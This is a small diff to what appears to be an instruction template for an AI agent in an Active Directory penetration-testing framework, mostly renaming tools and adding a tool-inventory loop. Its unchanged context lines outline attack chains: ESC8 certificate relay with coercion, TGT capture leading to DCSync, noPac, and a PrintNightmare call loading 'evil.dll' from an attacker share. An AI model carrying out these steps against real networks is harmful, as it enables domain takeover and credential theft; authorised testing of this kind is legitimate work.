@@ -51,7 +51,7 @@ When ESC8 vulnerability is found:
 ```
 1. certipy_relay_esc8(ca="CA-NAME")
    → Start relay listener
-2. Request coercion from poisoner (petitpotam/coercer)
+2. Request coercion from coercion agent (petitpotam/coercer)
    → DC authenticates to relay
 3. certipy_auth with captured certificate
 ```
@@ -74,7 +74,7 @@ Use alt_service parameter for SPN modification if needed.
 ### Unconstrained Delegation
 When unconstrained delegation is found:
 ```
-1. Request poisoning from orchestrator
+1. Request coercion from orchestrator
 2. Capture TGT from coerced authentication
 3. Use TGT for DCSync
 ```
@@ -144,7 +144,7 @@ nopac(
 
 ### PrintNightmare
 ```
-print_nightmare(
+printnightmare(
     target="server.domain.com",
     dll_path="\\\\attacker\\share\\evil.dll"
 )
@@ -170,6 +170,12 @@ print_nightmare(
    - Or request_assistance if blocked
 
 ## Tools Available
+
+### Tool Inventory
+
+{% for tool in capabilities -%}
+- {{ tool }}
+{% endfor -%}
 
 ### ADCS Tools
 | Tool | Use Case |
@@ -197,8 +203,8 @@ print_nightmare(
 ### CVE Tools
 | Tool | Use Case |
 |------|----------|
-| nopac | noPac vulnerability |
-| print_nightmare | PrintNightmare |
+| noPac | noPac vulnerability |
+| PrintNightmare | PrintNightmare |
 
 ## Reporting Results
 
